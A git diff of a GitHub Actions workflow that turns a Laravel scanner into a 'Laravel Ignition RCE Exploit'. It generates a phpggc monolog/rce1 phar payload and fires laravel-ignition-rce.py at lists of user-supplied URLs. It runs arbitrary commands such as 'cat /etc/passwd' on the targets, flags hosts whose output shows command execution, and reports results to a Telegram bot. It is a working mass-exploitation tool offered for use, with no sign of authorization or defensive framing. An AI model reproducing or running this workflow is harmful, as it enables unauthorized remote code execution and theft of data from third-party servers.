@@ -1,20 +1,16 @@
-name: Laravel Exploit Scanner
+name: Laravel Ignition RCE Exploit
 
 on:
   workflow_dispatch:
     inputs:
       urls:
-        description: 'URLs separated by spaces, commas, or mashed together (e.g., http://x.com/_ignition/execute-solutionhttp://y.com/...)'
+        description: 'URLs separated by spaces, commas, or mashed together'
         required: true
         type: string
       command:
-        description: 'Command to execute if vulnerable (e.g., id, whoami)'
+        description: 'Command to execute (e.g., id, whoami, cat /etc/passwd)'
         required: true
         default: 'id'
-      script_name:
-        description: 'Python script name from ambionics repo (default: laravel-bleed.py)'
-        required: true
-        default: 'laravel-bleed.py'
 
 jobs:
   laravel-exploit:
@@ -28,23 +24,47 @@ jobs:
 
       - name: Install Dependencies
         run: |
-          sudo apt-get update && sudo apt-get install -y jq zip
+          sudo apt-get update && sudo apt-get install -y jq zip php-cli php-gd php-mbstring php-xml php-curl unzip
           pip3 install requests pycryptodome bs4
 
-      - name: Clone Exploit Repository
+      - name: Setup Composer & phpggc
+        run: |
+          # Install Composer
+          curl -sS https://getcomposer.org/installer | sudo php -- --install-dir=/usr/local/bin --filename=composer
+          
+          # Clone phpggc and install its dependencies
+          git clone https://github.com/ambionics/phpggc.git
+          cd phpggc
+          composer install --no-interaction
+          cd ..
+
+      - name: Clone Laravel Exploit Repository
         run: |
           git clone https://github.com/ambionics/laravel-exploits.git || true
-          if [ ! -f "laravel-exploits/${{ github.event.inputs.script_name }}" ]; then
-            echo "ERROR: Script ${{ github.event.inputs.script_name }} not found in the repository!"
+          if [ ! -f "laravel-exploits/laravel-ignition-rce.py" ]; then
+            echo "ERROR: laravel-ignition-rce.py not found!"
             exit 1
           fi
+
+      - name: Generate Phar Payload
+        env:
+          CMD_INPUT: ${{ github.event.inputs.command }}
+        run: |
+          echo ">>> Generating exploit.phar for command: ${CMD_INPUT}"
+          # Generate the payload using phpggc (monolog/rce1 is standard for Laravel Ignition)
+          php -d "phar.readonly=0" ./phpggc/phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system "$CMD_INPUT" || true
+          
+          if [ ! -f "/tmp/exploit.phar" ]; then
+            echo "ERROR: Failed to generate exploit.phar!"
+            exit 1
+          fi
+          echo "Successfully generated exploit.phar"
 
       - name: Prepare URLs
         env:
           INPUT_URLS: ${{ github.event.inputs.urls }}
         run: |
           touch urls.txt
-          # Fix mashed URLs by adding newlines before http:// or https://
           echo "$INPUT_URLS" | sed 's/https:/\nhttps:/g' | sed 's/http:/\nhttp:/g' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | grep -v '^$' | sort -u > urls.txt
           URL_COUNT=$(wc -l < urls.txt | xargs)
           echo "Total URLs to test: ${URL_COUNT}"
@@ -55,7 +75,7 @@ jobs:
           TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
         run: |
           URL_COUNT=$(wc -l < urls.txt | xargs)
-          MESSAGE="🦠 Laravel Exploit Scanner Starting"$'\n'$'\n'"URLs: ${URL_COUNT}"$'\n'"Command: ${{ github.event.inputs.command }}"$'\n'"Script: ${{ github.event.inputs.script_name }}"
+          MESSAGE="🦠 Laravel Ignition RCE Scanner Starting"$'\n'$'\n'"URLs: ${URL_COUNT}"$'\n'"Command: ${{ github.event.inputs.command }}"
           curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
             -d chat_id="${TELEGRAM_CHAT_ID}" \
             --data-urlencode "text=${MESSAGE}" || true
@@ -65,8 +85,6 @@ jobs:
         env:
           TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
           TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
-          CMD_INPUT: ${{ github.event.inputs.command }}
-          SCRIPT_INPUT: ${{ github.event.inputs.script_name }}
         run: |
           while IFS= read -r url; do
             if [ -z "$url" ]; then continue; fi
@@ -76,13 +94,14 @@ jobs:
             
             echo "======================================" > "$RESULT_FILE"
             echo "TESTING URL: $url" >> "$RESULT_FILE"
+            echo "COMMAND: ${{ github.event.inputs.command }}" >> "$RESULT_FILE"
             echo "======================================" >> "$RESULT_FILE"
             
-            # Run the Python script with a 60-second timeout
-            timeout 60 python3 "laravel-exploits/$SCRIPT_INPUT" "$url" "$CMD_INPUT" >> "$RESULT_FILE" 2>&1 || true
+            # Run the Python script with the generated phar file, 60s timeout
+            timeout 60 python3 laravel-exploits/laravel-ignition-rce.py "$url" /tmp/exploit.phar >> "$RESULT_FILE" 2>&1 || true
             
             # Check if the command output (e.g., 'uid=' from 'id') is in the result
-            if grep -qi "uid=\|gid=\|root\|nobody\|www-data\|daemon" "$RESULT_FILE"; then
+            if grep -qi "uid=\|root\|nobody\|www-data\|daemon\|bin/bash\|total " "$RESULT_FILE"; then
               STATUS="🚨 VULNERABLE"
             else
               STATUS="✅ NOT VULNERABLE"
